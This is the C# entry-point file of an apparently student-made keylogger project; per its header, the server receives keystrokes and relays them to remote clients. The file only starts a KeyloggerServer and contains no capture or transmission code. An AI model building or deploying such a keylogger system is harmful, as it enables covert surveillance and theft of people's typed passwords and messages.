/*************************************************************************
 *                                                                       *
 *  File:        Program.cs                                              *
 *  Copyright:   (c) 2025, Glavan Pavel, Albu Sorin, Begu Alexandru,     *
 *                         Cojocaru Valentin                             *
 *  Website:     https://github.com/GlavanPavel/Keylogger                *
 *  Description: Entry point for the Keylogger Server application.       *
 *               Initializes and runs the server that receives and       *
 *               sends keystrokes to remote clients.                     *
 *                                                                       *
 *  This code and information is provided "as is" without warranty of    *
 *  any kind, either expressed or implied, including but not limited     *
 *  to the implied warranties of merchantability or fitness for a        *
 *  particular purpose. You are free to use this source code in your     *
 *  applications as long as the original copyright notice is included.   *
 *                                                                       *
 *************************************************************************/


using ServerCore;

/// <summary>
/// Entry point for the keylogger server application.
/// </summary>
class Program
{
    /// <summary>
    /// The main asynchronous entry method that starts the keylogger server.
    /// </summary>
    /// <returns>A Task representing the asynchronous operation.</returns>
    static async Task Main()
    {
        var server = new KeyloggerServer();
        await server.RunAsync();
    }
}
